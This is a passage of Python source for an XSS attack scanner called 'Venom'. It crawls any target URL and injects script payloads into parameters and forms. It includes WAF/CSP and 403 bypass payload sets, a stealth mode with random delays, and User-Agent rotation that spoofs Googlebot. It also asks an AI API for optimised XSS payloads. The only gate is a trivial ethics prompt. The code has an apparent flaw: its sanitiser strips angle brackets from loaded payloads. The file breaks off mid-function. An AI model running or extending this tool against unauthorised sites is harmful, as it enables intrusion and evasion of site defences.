#!/usr/bin/env python3
import requests
import sys
import re
import os
import time
import argparse
import threading
import queue
import random
from urllib.parse import urljoin, urlencode, urlparse, parse_qs
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import logging
from typing import Optional, List, Dict
import html
from requests.exceptions import RequestException, SSLError, Timeout
from concurrent.futures import ThreadPoolExecutor

# Setup logging
log_file = "venom.log"
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler(log_file, mode='a', encoding='utf-8'), logging.StreamHandler()]
)
logging.info("Logging initialized successfully")

# Colors
RED, GREEN, YELLOW, RESET, BOLD, WHITE = '\033[91m', '\033[92m', '\033[93m', '\033[0m', '\033[1m', '\033[97m'

# Thread-safe counter
class ThreadSafeCounter:
    def __init__(self):
        self.value = 0
        self.lock = threading.Lock()

    def increment(self):
        with self.lock:
            self.value += 1
            return self.value

    def get(self):
        with self.lock:
            return self.value

def sanitize_input(input_str: str) -> str:
    return re.sub(r'[;&|><`]', '', input_str)

def sanitize_path(path: str) -> str:
    return os.path.abspath(os.path.normpath(path))

def get_banner_and_features() -> str:
    banner = f"""
{GREEN}╔════════════════════════════════════════════════════════════════════╗{RESET}
{GREEN}║          ██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗           ║{RESET}
{GREEN}║          ██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║           ║{RESET}
{GREEN}║          ██║   ██║█████╗  ██╔██╗ ██║██║   ██╗██╔████╔██║           ║{RESET}
{GREEN}║          ██║   ██║██╔══╝  ██║╚██╗██║██║   ██╗██║╚██╔╝██║           ║{RESET}
{GREEN}║          ╚██████╔╝███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║           ║{RESET}
{GREEN}║           ╚═════╝ ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝           ║{RESET}
{GREEN}║                                                                    ║{RESET}
{GREEN}║                  Venom Advanced XSS Scanner 2025                   ║{RESET}
{GREEN}║                            Version 5.16                            ║{RESET}
{GREEN}║    Made by: YANIV AVISROR | PENETRATION TESTER | ETHICAL HACKER    ║{RESET}
{GREEN}╚════════════════════════════════════════════════════════════════════╝{RESET}
"""
    features = [
        "Advanced XSS detection with precise context analysis",
        "Session-aware POST requests with login support",
        "HTTP/HTTPS testing (no GUI/WebDriver)",
        "Dynamic payload loading by category (waf_bypass, 403bypass, etc.)",
        "WAF/CSP detection and bypass capabilities",
        "Payloads sourced from local files and GitHub",
        "AI-driven payload optimization (with API key)",
        "Stealth mode for discreet scanning"
    ]
    return banner + "\nCore Features:\n" + "\n".join(f"{GREEN}➤ {feature}{RESET}" for feature in features) + "\n"

def parse_args() -> argparse.Namespace:
    banner_and_features = get_banner_and_features()
    description = f"""{banner_and_features}
Venom Advanced XSS Scanner is a professional-grade tool for ethical penetration testers to identify XSS vulnerabilities. This version supports HTTP and HTTPS protocols, removes GUI dependencies, and enhances POST request handling with session management. Payloads are loaded dynamically from all .txt files in the specified directory, categorized for specific bypass needs (e.g., waf_bypass, 403bypass).

Usage:
  python3 venom.py <url> [options]

Arguments:
  url                   Target URL to scan (e.g., https://example.com)

Options:
  -h, --help            Show this help message and exit
  -w, --workers         Number of concurrent threads (default: 5, capped at 2 in stealth mode)
  --ai-assist           Enable AI-driven payload optimization (requires --ai-key)
  --ai-key              API key for AI assistance (e.g., xAI key)
  --scan-xss            Enable XSS scanning (required)
  --payloads-dir        Directory with custom payload files (default: ./payloads/)
  --timeout             HTTP request timeout in seconds (default: 10)
  --verbose             Enable detailed logging for diagnostics
  --stealth             Activate stealth mode for low-visibility scanning
  --min-delay           Min delay between tests in seconds (default: 5 in stealth, 0.5 otherwise)
  --max-delay           Max delay between tests in seconds (default: 15 in stealth, 1.5 otherwise)
  --full-report         Show all vulnerabilities in report (default: first 10)
  -H                    Custom HTTP headers (e.g., -H 'Cookie: sessionid=xyz')
  --method              HTTP method to use (default: get, options: get, post)
  --data                Data for POST request in 'key=value&key2=value2' format
  --payload-field       Field to inject payload into (e.g., 'password')
  --login-url           URL for login to establish session (optional)
  --login-data          Login credentials in 'key=value&key2=value2' format (optional)
"""
    
    parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("url", help="Target URL to scan")
    parser.add_argument("-w", "--workers", type=int, default=5, help="Number of concurrent threads")
    parser.add_argument("--ai-assist", action="store_true", help="Enable AI-driven payload optimization")
    parser.add_argument("--ai-key", type=str, default=None, help="API key for AI assistance")
    parser.add_argument("--scan-xss", action="store_true", help="Enable XSS scanning (required)", required=True)
    parser.add_argument("--payloads-dir", default="./payloads/", help="Directory with custom payload files")
    parser.add_argument("--timeout", type=int, default=10, help="HTTP request timeout in seconds")
    parser.add_argument("--verbose", action="store_true", help="Enable detailed logging")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode", default=False)
    parser.add_argument("--min-delay", type=float, help="Min delay between tests in seconds")
    parser.add_argument("--max-delay", type=float, help="Max delay between tests in seconds")
    parser.add_argument("--full-report", action="store_true", help="Show all vulnerabilities in report")
    parser.add_argument("-H", action='append', help="Custom HTTP headers", default=[])
    parser.add_argument("--method", choices=['get', 'post'], default='get', help="HTTP method to use")
    parser.add_argument("--data", type=str, default=None, help="Data for POST request")
    parser.add_argument("--payload-field", type=str, default=None, help="Field to inject payload into")
    parser.add_argument("--login-url", type=str, default=None, help="URL for login to establish session")
    parser.add_argument("--login-data", type=str, default=None, help="Login credentials for POST")

    print(banner_and_features)
    while True:
        response = input(f"{RED}[!] Ethical use only (YES/NO): {RESET}").strip().upper()
        if response == "YES":
            print(f"{GREEN}[+] Ethical use confirmed. Initiating scan...{RESET}")
            break
        elif response == "NO":
            print(f"{RED}[!] This tool is for ethical use only. Exiting.{RESET}")
            sys.exit(0)
        else:
            print(f"{YELLOW}[!] Please enter YES or NO.{RESET}")

    args = parser.parse_args()
    args.payloads_dir = sanitize_path(args.payloads_dir)
    if args.stealth:
        args.workers = min(args.workers, 2)
        args.min_delay = args.min_delay if args.min_delay is not None else 5
        args.max_delay = args.max_delay if args.max_delay is not None else 15
        print(f"{GREEN}[+] Stealth mode enabled: Workers limited to {args.workers}, Delays: {args.min_delay}-{args.max_delay}s{RESET}")
    else:
        args.min_delay = args.min_delay if args.min_delay is not None else 0.5
        args.max_delay = args.max_delay if args.max_delay is not None else 1.5
    if args.ai_assist and not args.ai_key:
        print(f"{YELLOW}[!] Warning: --ai-assist enabled without --ai-key. Using default payload enhancement.{RESET}")
    if args.method == 'post' and not args.data:
        print(f"{YELLOW}[!] Warning: POST method selected without --data. No data will be sent unless forms are detected.{RESET}")
    if args.login_url and not args.login_data:
        print(f"{RED}[!] Error: --login-url provided without --login-data. Exiting.{RESET}")
        sys.exit(1)
    command = " ".join(sys.argv)
    print(f"{GREEN}[+] Command executed: {command}{RESET}")
    return args

def fetch_payloads_from_github(urls: List[str], timeout: int) -> List[str]:
    payloads = []
    headers = {'User-Agent': 'Venom-XSS-Scanner/5.16'}
    session = requests.Session()
    session.mount('https://', HTTPAdapter(max_retries=Retry(total=5, backoff_factor=2)))
    for url in urls:
        try:
            response = session.get(url, headers=headers, timeout=timeout, verify=True)
            response.raise_for_status()
            content = response.text
            extracted = re.findall(r'`([^`]+)`', content)
            payloads.extend([sanitize_input(p.strip()) for p in extracted if p.strip() and '<' in p])
            logging.info(f"Fetched {len(extracted)} payloads from {url}")
        except (RequestException, SSLError, Timeout) as e:
            logging.error(f"Failed to fetch payloads from {url}: {e}")
    return payloads

class PayloadGenerator:
    def __init__(self, payloads_dir: str, bypass_needed: bool = False, use_403_bypass: bool = False, stealth: bool = False):
        self.payloads_dir = payloads_dir
        self.bypass_needed = bypass_needed
        self.use_403_bypass = use_403_bypass
        self.stealth = stealth
        self.payloads = self.load_payloads()

    def load_payloads(self) -> List[str]:
        default_payloads = [
            "<script>alert('venom')</script>",
            "<img src=x onerror=alert('venom')>",
            "<svg onload=alert('venom')>",
            "<script>console.log('XSS')</script>",
            "<img src=x onerror=console.log('XSS')>",
            "<script>document.domain</script>",
            "javascript:alert('XSS')",
            "<style>body{background:url('javascript:alert(\"XSS\")')}</style>"
        ]
        stealth_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
        ]
        
        payloads = []
        if not os.path.exists(self.payloads_dir):
            logging.warning(f"Payloads directory {self.payloads_dir} not found; using defaults.")
            return stealth_payloads if self.stealth else default_payloads

        category_map = {
            'waf_bypass': 'waf_bypass.txt',
            '403bypass': '403bypass.txt',
            'default': ['advanced_xss.txt', 'xss_payloads.txt', 'basic_xss.txt']
        }

        if self.bypass_needed:
            selected_category = 'waf_bypass'
        elif self.use_403_bypass:
            selected_category = '403bypass'
        else:
            selected_category = 'default'

        all_files = [f for f in os.listdir(self.payloads_dir) if f.endswith('.txt')]
        if not all_files:
            logging.warning(f"No .txt files found in {self.payloads_dir}; using defaults.")
            return stealth_payloads if self.stealth else default_payloads

        if selected_category == 'default':
            for filename in category_map['default']:
                file_path = os.path.join(self.payloads_dir, filename)
                if file_path in [os.path.join(self.payloads_dir, f) for f in all_files]:
                    with open(file_path, 'r', encoding='utf-8') as f:
                        payloads.extend(sanitize_input(line.strip()) for line in f if line.strip())
                    logging.info(f"Loaded default payloads from {file_path}")
        else:
            file_path = os.path.join(self.payloads_dir, category_map[selected_category])
            if file_path in [os.path.join(self.payloads_dir, f) for f in all_files]:
                with open(file_path, 'r', encoding='utf-8') as f:
                    payloads.extend(sanitize_input(line.strip()) for line in f if line.strip())
                logging.info(f"Loaded {selected_category} payloads from {file_path}")
            else:
                logging.warning(f"No {selected_category} file found; falling back to all .txt files.")
                for filename in all_files:
                    file_path = os.path.join(self.payloads_dir, filename)
                    with open(file_path, 'r', encoding='utf-8') as f:
                        payloads.extend(sanitize_input(line.strip()) for line in f if line.strip())
                    logging.info(f"Loaded payloads from {file_path}")

        if not self.stealth:
            github_urls = [
                "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md",
                "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/2%20-%20XSS%20Polyglot.md",
                "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/5%20-%20XSS%20in%20Angular.md"
            ]
            github_payloads = fetch_payloads_from_github(github_urls, 15)
            payloads.extend(github_payloads)

        if not payloads:
            logging.warning(f"No payloads loaded; using defaults.")
            payloads = stealth_payloads if self.stealth else default_payloads
        
        logging.info(f"Loaded {len(payloads)} total payloads (local + GitHub)")
        return list(set(payloads))

    def generate(self) -> List[str]:
        return self.payloads

class AIAssistant:
    def __init__(self, payloads: List[str], api_key: Optional[str] = None, api_endpoint: str = None):
        self.payloads = payloads
        self.api_key = api_key
        self.api_endpoint = api_endpoint or os.getenv("AI_API_ENDPOINT", "https://api.example.com/completions")
        self.success_history: Dict[str, dict] = {}
        self.lock = threading.Lock()
        if self.api_key and self.api_endpoint:
            logging.info(f"AI assistance enabled with API endpoint: {self.api_endpoint}")
        else:
            logging.info("AI assistance disabled (no API key or endpoint provided). Using default enhancement.")

    def suggest_payloads(self, response: Optional[str] = None, initial_run: bool = False, status_code: int = 200) -> List[str]:
        executable_payloads = [p for p in self.payloads if 'alert(' in p.lower() or 'console.log(' in p.lower() or 'document.domain' in p.lower()]
        other_payloads = [p for p in self.payloads if 'alert(' not in p.lower() and 'console.log(' not in p.lower() and 'document.domain' not in p.lower()]
        
        if status_code == 404 or "timed out" in str(response).lower():
            executable_payloads = sorted(executable_payloads, key=len)[:10]
            logging.info("Prioritizing shorter payloads due to timeouts or 404s.")
        
        if initial_run or not self.success_history:
            if self.api_key and self.api_endpoint and response:
                ai_suggestions = self.get_ai_suggestions(response)
                executable_payloads.extend(ai_suggestions)
                logging.info(f"AI-enhanced payload set generated: {len(ai_suggestions)} additional payloads added.")
            else:
                enhanced = [f"{p}XSS-{random.randint(1000, 9999)}" for p in executable_payloads[:5]]
                executable_payloads.extend(enhanced)
                logging.info(f"Default enhancement applied: {len(enhanced)} additional payloads added.")
            return list(set(executable_payloads + other_payloads))
        
        if response and self.api_key and self.api_endpoint:
            context = 'html' if '<' in response else 'js' if 'script' in response.lower() else 'unknown'
            with self.lock:
                sorted_payloads = sorted(
                    executable_payloads,
                    key=lambda p: self.success_history.get(p, {"weight": 0.0, "context": "unknown"})["weight"] * 
                                  (1.5 if context in self.success_history.get(p, {}).get("context", "") else 1) -
                                  (0.5 if status_code == 404 else 0),
                    reverse=True
                )
            ai_suggestions = self.get_ai_suggestions(response)
            sorted_payloads.extend(ai_suggestions)
            sorted_payloads.extend(other_payloads)
            sorted_payloads = list(set(sorted_payloads))
            logging.info(f"AI suggested {len(ai_suggestions)} payloads. Total: {len(sorted_payloads)}")
            return sorted_payloads
        
        return list(set(executable_payloads + other_payloads))

    def get_ai_suggestions(self, response: str) -> List[str]:
        try:
            headers = {"Authorization": f"Bearer {self.api_key}", "Content-Type": "application/json"}
            data = {
                "prompt": f"Suggest optimized XSS payloads for this web response:\n{response[:500]}",
                "max_tokens": 100
            }
            parsed_url = urlparse(self.api_endpoint)
            if not (parsed_url.scheme in ['http', 'https'] and parsed_url.netloc):
                raise ValueError(f"Invalid AI API endpoint: {self.api_endpoint}")
            ai_response = requests.post(self.api_endpoint, json=data, headers=headers, timeout=10, verify=True)
            ai_response.raise_for_status()
            suggestions = ai_response.json().get("choices", [{}])[0].get("text", "").splitlines()
            return [sanitize_input(s.strip()) for s in suggestions if s.strip() and '<' in s]
        except (RequestException, ValueError) as e:
            logging.error(f"AI API call failed: {e}")
            return []

    def record_success(self, payload: str, context: str = "unknown", status_code: int = 200) -> None:
        with self.lock:
            if payload not in self.success_history:
                self.success_history[payload] = {"success_count": 0, "weight": 0.0, "context": context}
            if status_code == 200:
                self.success_history[payload]["success_count"] += 1
                self.success_history[payload]["weight"] = min(1.0, self.success_history[payload]["weight"] + 0.2)
                logging.info(f"AI success recorded: {payload}, weight: {self.success_history[payload]['weight']}")

class Venom:
    def __init__(self, args: argparse.Namespace):
        self.args = args
        self.session = requests.Session()
        self.session.mount('http://', HTTPAdapter(max_retries=Retry(total=5, backoff_factor=2), pool_maxsize=200))
        self.session.mount('https://', HTTPAdapter(max_retries=Retry(total=5, backoff_factor=2), pool_maxsize=200))
        self.session.headers.update({
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
                'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0'
            ]),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://www.google.com/',
            'Content-Type': 'application/x-www-form-urlencoded'
        })

        if args.H:
            for header in args.H:
                try:
                    key, value = header.split(':', 1)
                    self.session.headers.update({sanitize_input(key.strip()): sanitize_input(value.strip())})
                except ValueError:
                    logging.warning(f"Invalid header format: {header}")

        self.post_data = {}
        if args.data:
            for pair in args.data.split('&'):
                key, value = pair.split('=', 1)
                self.post_data[key] = value

        if args.login_url and args.login_data:
            login_data = {}
            for pair in args.login_data.split('&'):
                key, value = pair.split('=', 1)
                login_data[key] = value
            try:
                login_response = self.session.post(args.login_url, data=login_data, timeout=args.timeout, verify=True)
                if login_response.status_code == 200 or login_response.status_code == 302:
                    logging.info(f"Login successful to {args.login_url}, session established")
                    if 'Set-Cookie' in login_response.headers:
                        logging.info(f"Session cookies received: {login_response.headers['Set-Cookie']}")
                else:
                    logging.warning(f"Login failed to {args.login_url} (Status: {login_response.status_code}), proceeding without authentication")
            except RequestException as e:
                logging.error(f"Login attempt failed: {e}")
                print(f"{YELLOW}[!] Login failed, proceeding without authentication.{RESET}")

        self.task_queue = queue.Queue()
        self.lock = threading.Lock()
        self.vulnerabilities = []
        self.visited_urls = set()
        self.total_tests = ThreadSafeCounter()
        self.total_payloads = 0
        self.current_payload = "Initializing..."
        self.start_time = time.time()
        self.running = True
        self.domain = urlparse(args.url).netloc
        self.waf_csp_status = "Unknown"
        self.bypass_performed = False
        self.waf_tech = None
        self.use_403_bypass = False

        self.initial_waf_csp_check()
        self.executor = ThreadPoolExecutor(max_workers=args.workers)
        self.payload_generator = PayloadGenerator(self.args.payloads_dir, self.bypass_performed, self.use_403_bypass, self.args.stealth)
        self.payloads = self.payload_generator.generate()
        self.total_payloads = len(self.payloads)
        self.ai_assistant = AIAssistant(self.payloads, self.args.ai_key) if self.args.ai_assist else None
        print(f"{GREEN}[+] AI Assistance: {'Enabled' if self.ai_assistant and self.args.ai_key else 'Enabled (Default Mode)' if self.args.ai_assist else 'Disabled'}{RESET}")

    def initial_waf_csp_check(self) -> None:
        try:
            response = self.session.get(self.args.url, timeout=self.args.timeout, verify=True)
            headers = response.headers
            waf_indicators = {'cloudflare': 'cloudflare', 'akamai': 'akamai', 'sucuri': 'sucuri', 'mod_security': 'mod_security', 'generic': 'x-waf'}
            csp = headers.get('Content-Security-Policy', '')
            detected = False
            for tech, indicator in waf_indicators.items():
                if indicator.lower() in str(headers).lower():
                    self.waf_tech = tech
                    self.waf_csp_status = f"WAF detected ({tech})"
                    detected = True
                    logging.info(f"Initial check: WAF detected: {tech}")
                    break
            if not detected and csp:
                self.waf_csp_status = "CSP detected"
                detected = True
                logging.info("Initial check: CSP detected")
            
            if detected:
                print(f"{YELLOW}[!] Detected: {self.waf_csp_status}{RESET}")
                while True:
                    bypass = input(f"{YELLOW}[?] Attempt WAF/CSP bypass? (YES/NO): {RESET}").strip().upper()
                    if bypass == "YES":
                        self.bypass_performed = True
                        logging.info("User confirmed WAF/CSP bypass attempt.")
                        self.payload_generator = PayloadGenerator(self.args.payloads_dir, self.bypass_performed, self.use_403_bypass, self.args.stealth)
                        self.payloads = self.payload_generator.generate()
                        with self.lock:
                            self.total_payloads = len(self.payloads)
                        self.ai_assistant = AIAssistant(self.payloads, self.args.ai_key) if self.args.ai_assist else None
                        break
                    elif bypass == "NO":
                        logging.info("User declined WAF/CSP bypass.")
                        break
                    else:
                        print(f"{YELLOW}[!] Please enter YES or NO.{RESET}")
            else:
                self.waf_csp_status = "No WAF/CSP detected"
                logging.info("Initial check: No WAF/CSP detected")
        except RequestException as e:
            logging.error(f"Initial WAF/CSP check failed: {e}")
            print(f"{YELLOW}[!] WAF/CSP check failed. Proceeding anyway.{RESET}")

    def check_connection(self, url: str) -> bool:
        try:
            response = self.session.get(url, timeout=self.args.timeout, allow_redirects=True, verify=True)
            logging.info(f"Connection check for {url}: Status {response.status_code}, Length {len(response.text)}")
            if self.args.verbose:
                logging.info(f"Response content: {response.text[:100]}...")
            if len(response.text) < 100 or '<html' not in response.text.lower():
                print(f"{YELLOW}[!] Warning: Target {url} returned a minimal response ({len(response.text)} bytes). Consider testing a different URL with more content.{RESET}")
                return False
            return response.status_code < 400 or response.status_code in [403, 502]
        except (RequestException, SSLError, Timeout) as e:
            logging.error(f"Connection check failed for {url}: {e}")
            print(f"{YELLOW}[!] Connection failed for {url}. Proceeding anyway.{RESET}")
            return False

    def calculate_total_tests(self, url: str, soup: BeautifulSoup) -> int:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        param_keys = list(params.keys())
        for tag in soup.find_all(['input', 'textarea', 'select']):
            name = tag.get('name') or tag.get('id')
            if name and not tag.get('type') == 'hidden' and not tag.get('readonly') and not tag.get('disabled') and name not in param_keys:
                param_keys.append(name)
        form_params = sum(len(form.find_all(['input', 'textarea', 'select'])) for form in soup.find_all('form'))
        return len(self.payloads) * max(len(param_keys) + form_params, 1)

    def scan(self) -> None:
        logging.info(f"Starting scan on {self.args.url}")
        print(f"{GREEN}[+] Starting XSS scan on {self.args.url}{RESET}")
        if not self.check_connection(self.args.url):
            print(f"{RED}[!] Scan aborted: Target URL is not suitable for testing.{RESET}")
            return
        self.crawl(self.args.url)
        
        with ThreadPoolExecutor(max_workers=self.args.workers) as executor:
            while not self.task_queue.empty() and self.running:
                try:
                    task = self.task_queue.get(timeout=15)
                    executor.submit(task)
                    self.task_queue.task_done()
                    delay = random.uniform(self.args.min_delay, self.args.max_delay)
                    time.sleep(delay)
                except queue.Empty:
                    logging.warning("Task queue timeout. Completing scan.")
                    break
        
        self.running = False
        self._display_status()
        print("\n")
        self.report()

    def crawl(self, url: str, depth: int = 0, max_depth: int = 3) -> None:
        with self.lock:
            if url in self.visited_urls or depth > max_depth or urlparse(url).netloc != self.domain:
                return
            self.visited_urls.add(url)
        try:
            response = self.session.get(url, timeout=self.args.timeout, verify=True)
            if response.status_code == 403 and not self.use_403_bypass:
                logging.info(f"Received 403 for {url}. Switching to 403 bypass.")
                self.use_403_bypass = True
                self.payload_generator = PayloadGenerator(self.args.payloads_dir, self.bypass_performed, self.use_403_bypass, self.args.stealth)
                self.payloads = self.payload_generator.generate()
                with self.lock:
                    self.total_payloads = len(self.payloads)
                self.ai_assistant = AIAssistant(self.payloads, self.args.ai_key) if self.args.ai_assist else None
            logging.info(f"Crawled {url}: Status {response.status_code}, Length {len(response.text)}")
            if self.args.verbose:
                logging.info(f"Response content: {response.text[:100]}...")
            soup = BeautifulSoup(response.text, 'html.parser')
            with self.lock:
                self.total_payloads += self.calculate_total_tests(url, soup) - len(self.payloads)
            payloads = self.ai_assistant.suggest_payloads(response.text, initial_run=(depth == 0), status_code=response.status_code) if self.ai_assistant else self.payloads
            self.test_injection_points(url, response, soup, payloads)
            forms = soup.find_all('form')
            for form in forms:
                action = urljoin(url, form.get('action', ''))
                if urlparse(action).netloc == self.domain:
                    self.task_queue.put(lambda f=form, a=action, p=payloads: self.test_form(a, f, p))
            common_paths = ['/', '/about', '/contact', '/search', '/downloads', '/index.php', '/login', '/register']
            for path in common_paths:
                new_url = urljoin(url, path)
                with self.lock:
                    if new_url not in self.visited_urls and urlparse(new_url).netloc == self.domain:
                        self.task_queue.put(lambda u=new_url: self.crawl(u, depth + 1, max_depth))
        except RequestException as e:
            logging.error(f"HTTP/HTTPS crawl failed for {url}: {e}")
            print(f"{YELLOW}[!] Crawl failed for {url}. Skipping.{RESET}")

    def test_injection_points(self, url: str, response: requests.Response, soup: BeautifulSoup, payloads: List[str]) -> None:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        param_keys = list(params.keys())
        for tag in soup.find_all(['input', 'textarea', 'select']):
            name = tag.get('name') or tag.get('id')
            if name and not tag.get('type') == 'hidden' and not tag.get('readonly') and not tag.get('disabled') and name not in param_keys:
                param_keys.append(name)
        if not param_keys or url.endswith('/login'):
            param_keys = ['log', 'pwd', 'rememberme', 'wp-submit', 'redirect_to', 'p']
            if not soup.find_all('form'):
                logging.warning(f"No forms found on {url}. Using default login parameters: {param_keys}")
                print(f"{YELLOW}[!] No forms detected on {url}. Testing default login parameters.{RESET}")
        param_keys = [k for k in param_keys if not k.startswith('http') and not k.startswith('javascript')]
        logging.info(f"Testing injection points with params: {param_keys} on {url}")
        print(f"{GREEN}[+] Testing injection points on {url} with {len(param_keys)} parameters{RESET}")
        base_url = url.split('?', 1)[0]
        for payload in payloads:
            self.current_payload = payload
            self.total_tests.increment()
            for param in param_keys:
                test_params = {param: payload}
                self.task_queue.put(lambda p=param, tp=test_params, pl=payload: self.test_request(base_url, tp, pl, self.args.method, injection_point=f"Query String ({p})"))

    def test_form(self, action: str, form: BeautifulSoup, payloads: List[str]) -> None:
        inputs = {inp.get('name'): inp.get('value', '') for inp in form.find_all(['input', 'textarea', 'select']) if inp.get('name') and inp.get('type') != 'hidden' and not inp.get('readonly') and not inp.get('disabled')}
        if not inputs:
            inputs = {tag.get('id') or f"unnamed_{i}": '' for i, tag in enumerate(form.find_all(['input', 'textarea', 'select'])) if tag.get('type') != 'hidden' and not tag.get('readonly') and not tag.get('disabled')}
        logging.info(f"Testing form inputs: {list(inputs.keys())} on {action}")
        print(f"{GREEN}[+] Testing form at {action} with {len(inputs)} inputs{RESET}")
        for name in inputs:
            for payload in payloads:
                self.current_payload = payload
                self.total_tests.increment()
                test_params = inputs.copy()
                if self.args.payload_field and self.args.payload_field in test_params:
                    test_params[self.args.payload_field] = payload
                else:
                    test_params[name] = payload
                self.task_queue.put(lambda n=name, tp=test_params, pl=payload: self.test_request(action, tp, pl, 'post', injection_point=f"Form Field ({n})"))

    def test_request(self, url: str, params: dict, payload: str, method: str = 'get', injection_point: str = 'Unknown') -> None:
        retry_attempts = 5
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Googlebot/2.1 (+http://www.google.com/bot.html)'
        ]
        
        for attempt in range(retry_attempts):
            try:
                if attempt > 0:
                    self.session.headers['User-Agent'] = random.choice(user_agents)
                    logging.info(f"Retrying {method.upper()} {url} with new User-Agent: {self.session.headers['User-Agent']}")
                
                logging.info(f"Testing {method.upper()} {url} with payload: {payload} at {injection_point} (Attempt {attempt+1})")
                data = self.post_data.copy() if method == 'post' else None
                if method == 'post' and params:
                    if self.args.payload_field and self.args.payload_field in data:
                        data[self.args.payload_field] = payload
                    else:
                        data.update(params)
                resp = self.session.request(
                    method, url,
                    params=params if method == 'get' else None,
                    data=data if method == 'post' else None,
                    headers=self.session.headers,
                    timeout=self.args.timeout,
                    verify=True
                )
                status_code = resp.status_code
                
                if status_code in [403, 500, 501, 502] and attempt < retry_attempts - 1:
                    logging.info(f"Received {status_code} for {url}. Attempting bypass on attempt {attempt+2}.")
                    if status_code == 403 and not self.use_403_bypass:
                        self.use_403_bypass = True
                        self.payload_generator = PayloadGenerator(self.args.payloads_dir, self.bypass_performed, self.use_403_bypass, self.args.stealth)
                        self.payloads = self.payload_generator.generate()
                        with self.lock:
                            self.total_payloads = len(self.payloads)
                        self.ai_assistant = AIAssistant(self.payloads, self.args.ai_key) if self.args.ai_assist else None
                    continue
                
                logging.info(f"Response status: {status_code}, length: {len(resp.text)}")
                if self.args.verbose:
                    logging.info(f"Response content: {resp.text[:100]}...")
                full_url = url + ('?' + urlencode(params) if method == 'get' and params else '')
                
                # שיפור זיהוי XSS עם ניתוח תגובה מלא
                response_text = html.unescape(resp.text.lower())
                reflected = payload.lower() in response_text
                
                # בדיקת הקשר מבצעי מדויק
                in_executable_context = False
                soup = BeautifulSoup(resp.text, 'html.parser')
                
                # בדיקה בתוך תגית <script>
                for script in soup.find_all('script'):
                    if payload.lower() in script.text.lower():
                        in_executable_context = True
                        break
                
                # בדיקת מאפייני on*
                if not in_executable_context:
                    for tag in soup.find_all(True):
                        for attr, value in tag.attrs.items():
                            if attr.startswith('on') and payload.lower() in str(value).lower():
                                in_executable_context = True
                                break
                        if in_executable_context:
                            break
                
                # בדיקת eval או setTimeout ישירות בתגובה
                if not in_executable_context and ('eval(' in response_text or 'settimeout(' in response_text):
                    eval_split = response_text.split('eval(')
                    settimeout_split = response_text.split('settimeout(')
                    if len(eval_split) > 1 and payload.lower() in eval_split[1]:
                        in_executable_context = True
                    elif len(settimeout_split) > 1 and payload.lower() in settimeout_split[1]:
                        in_executable_context = True
                
                if reflected and in_executable_context and payload.strip():
                    severity = "High" if "alert(" in payload.lower() or "on" in payload.lower() else "Medium"
                    self.report_vulnerability(full_url, payload, params, f"{injection_point} XSS (Executable, Severity: {severity})", popup=True)
                elif reflected:
                    self.report_vulnerability(full_url, payload, params, f"{injection_point} XSS (Reflected Only, Severity: Low)", popup=False)
                
                self._display_status()
                break
                
            except (RequestException, SSLError, Timeout) as e:
                logging.warning(f"Request failed for {url}: {e} (Attempt {attempt+1})")
                if attempt == retry_attempts - 1:
                    logging.error(f"All {retry_attempts} attempts failed for {url}")
                    self._display_status()
                time.sleep(2 ** attempt)

    def _display_status(self) -> None:
        elapsed = int(time.time() - self.start_time)
        progress = (self.total_tests.get() / self.total_payloads * 100) if self.total_payloads else 0
        progress = min(progress, 100.0)
        payload_trunc = f"{self.current_payload[:40]}..." if len(self.current_payload) > 40 else self.current_payload
        status = f"{GREEN}╔════ Scan Status ════╗{RESET}\n" \
                 f"{GREEN}║{RESET} Progress: {WHITE}{progress:.1f}%{RESET}  Tests: {WHITE}{self.total_tests.get()}/{self.total_payloads}{RESET}  Vulns: {WHITE}{len(self.vulnerabilities)}{RESET}\n" \
                 f"{GREEN}║{RESET} Payload: {YELLOW}{payload_trunc}{RESET}\n" \
                 f"{GREEN}║{RESET} Elapsed: {WHITE}{elapsed}s{RESET}\n" \
                 f"{GREEN}╚═════════════════════╝{RESET}"
        sys.stdout.write(f"\033[2K\r{status}")
        sys.stdout.flush()

    def report_vulnerability(self, url: str, payload: str, params: dict, vuln_type: str = 'XSS', popup: bool = False) -> None:
        with self.lock:
            if not payload.strip():
                logging.info(f"Skipping empty payload report for {url}")
                return
            full_url = url + ('?' + urlencode(params) if self.args.method == 'get' and params else '')
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
            vuln = {
                'url': full_url,
                'payload': payload,
                'type': vuln_type,
                'timestamp': timestamp,
                'executed': popup,
